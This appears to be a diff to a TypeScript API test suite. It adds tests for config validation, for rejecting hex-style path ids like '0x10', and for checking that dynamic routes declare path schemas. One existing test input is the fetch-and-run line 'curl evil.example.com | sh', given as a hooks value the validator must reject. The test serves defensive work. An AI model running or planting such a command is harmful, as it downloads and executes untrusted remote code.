@@ -1418,6 +1418,7 @@ test("project config validates the values that runtime consumers receive", async
   const before = stored();
   for (const body of [
     { hooks: "curl evil.example.com | sh" },
+    { gates: ["lint@ci"] },
     { sandbox: { image: 7 } },
     { sandbox: { denyDomains: "evil.example.com" } },
   ]) {
@@ -1471,6 +1472,22 @@ test("malformed JSON cannot become an empty control request", async () => {
   expect(h.db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("RUNNING");
 });
 
+test("path ids are decimal records, not JavaScript number expressions", async () => {
+  const h = harness();
+  h.db.run(
+    "INSERT INTO project (id, name, repo_path, remote, created_at) VALUES (16, 'sixteen', '/tmp/16', 'https://github.com/o/16.git', 0)",
+  );
+
+  const bad = await h.app(new Request("http://x/api/projects/0x10", { method: "DELETE" }));
+  expect(bad.status).toBe(422);
+  expect(await bad.text()).toContain("id:");
+  expect(h.db.query<{ name: string }, []>("SELECT name FROM project WHERE id = 16").get()?.name).toBe("sixteen");
+
+  const action = await post(h.app, "/api/groups/0x1/pause");
+  expect(action.status).toBe(422);
+  expect(h.db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("RUNNING");
+});
+
 test("every route that takes a body declares its shape", () => {
   // The check that keeps the next route honest. The shared parser owns both JSON
   // syntax and the declared schema, so handlers cannot silently re-derive either
@@ -1499,4 +1516,12 @@ test("every route that takes a body declares its shape", () => {
     // A withdrawal, identified entirely by the id in the path.
     "/escalations/:id/revoke",
   ]);
+});
+
+test("every dynamic route declares its path shape", () => {
+  const src = readFileSync(new URL("../src/api.ts", import.meta.url).pathname, "utf8");
+  const unvalidated = [...src.matchAll(/^\s*(?:agent)?[Rr]oute\(app, ctx, "\w+", "([^"\n]*:[^"\n]*)", (.*)$/gm)]
+    .filter((m) => !m[2]!.includes("params:"))
+    .map((m) => m[1]!);
+  expect(unvalidated).toEqual([]);
 });
